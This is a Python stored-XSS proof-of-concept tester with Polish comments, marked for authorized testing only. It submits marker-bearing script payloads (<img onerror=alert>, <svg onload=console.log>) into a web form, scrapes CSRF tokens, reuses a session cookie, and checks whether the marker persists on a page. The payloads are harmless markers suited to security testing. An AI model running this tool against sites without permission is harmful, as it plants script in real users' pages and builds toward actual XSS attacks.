#!/usr/bin/env python3
"""Stored XSS PoC — tylko na systemach z wyraźną autoryzacją.

Wykrywa marker w odpowiedzi po zapisie i (opcjonalnie) na stronie listy.
"""
import argparse
import re
import sys
import uuid
from urllib.parse import urljoin

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

MARKER = f"XSS-STORED-POC-{uuid.uuid4().hex[:8]}"
PAYLOADS = [
    f"[{MARKER}]",
    f'<img src=x onerror=alert("{MARKER}")>',
    f'<svg/onload=console.log("{MARKER}")>',
]


def fetch(session: requests.Session, url: str, method: str, **kwargs) -> requests.Response:
    method = method.upper()
    if method == "GET":
        return session.get(url, timeout=15, **kwargs)
    return session.post(url, timeout=15, **kwargs)


def body_contains_marker(text: str, marker: str) -> bool:
    if marker in text:
        return True
    # czasem encje HTML
    return marker.replace("-", "&#45;") in text or re.search(re.escape(marker), text, re.I) is not None


def main() -> int:
    p = argparse.ArgumentParser(description="Stored XSS PoC (authorized testing only)")
    p.add_argument("--submit-url", required=True, help="URL formularza zapisu (POST)")
    p.add_argument("--field", required=True, help="Nazwa pola (np. comment, body, message)")
    p.add_argument("--verify-url", help="URL do odczytu zapisanej treści (GET). Domyślnie = submit-url")
    p.add_argument("--method", default="POST", choices=["GET", "POST"])
    p.add_argument("--extra", action="append", default=[], metavar="K=V", help="Dodatkowe pola formularza")
    p.add_argument("--cookie", help='Nagłówek Cookie, np. "session=abc"')
    p.add_argument("--csrf-field", help="Nazwa pola CSRF token")
    p.add_argument("--csrf-url", help="URL strony z formularzem (pobierze token regexem)")
    p.add_argument("--payload-index", type=int, default=0, choices=range(len(PAYLOADS)))
    args = p.parse_args()

    verify_url = args.verify_url or args.submit_url
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Stored-XSS-PoC/1.0 (authorized security test)",
    })
    if args.cookie:
        session.headers["Cookie"] = args.cookie

    data = {}
    for pair in args.extra:
        if "=" not in pair:
            print(f"Invalid --extra: {pair}")
            return 2
        k, v = pair.split("=", 1)
        data[k] = v

    if args.csrf_field and args.csrf_url:
        r = session.get(args.csrf_url, timeout=15)
        r.raise_for_status()
        m = re.search(
            rf'name=["\']{re.escape(args.csrf_field)}["\'][^>]*value="([^"\']*)"',
            r.text,
            re.I,
        )
        if not m:
            m = re.search(
                rf'value="([^"\']*)"[^>]*name=["\']{re.escape(args.csrf_field)}["\']',
                r.text,
                re.I,
            )
        if m:
            data[args.csrf_field] = m.group(1)
        else:
            print("Nie znaleziono tokenu CSRF — podaj ręcznie w --extra")
            return 2

    payload = PAYLOADS[args.payload_index]
    data[args.field] = payload

    print(f"[*] Marker: {MARKER}")
    print(f"[*] Wysyłam payload na {args.submit_url}")
    submit = fetch(session, args.submit_url, args.method, data=data)
    print(f"[*] Submit: HTTP {submit.status_code}")

    reflected_on_submit = body_contains_marker(submit.text, MARKER)
    if reflected_on_submit:
        print("[!] Marker w odpowiedzi OD RAZU po submit — możliwy Reflected/DOM, niekoniecznie Stored")

    print(f"[*] Weryfikacja stored: GET {verify_url}")
    verify = session.get(verify_url, timeout=15)
    verify.raise_for_status()

    if body_contains_marker(verify.text, MARKER):
        print("[VULN] Marker na stronie odczytu — silna wskazówka Stored XSS (lub persistent reflection)")
        print(f"      Szukaj w HTML: {MARKER}")
        return 0

    print("[OK] Marker nie pojawił się na verify-url (brak oczywistego Stored XSS w tym teście)")
    print("     Sprawdź ręcznie: inna sesja, lista wpisów, panel admina, e-mail z treścią.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
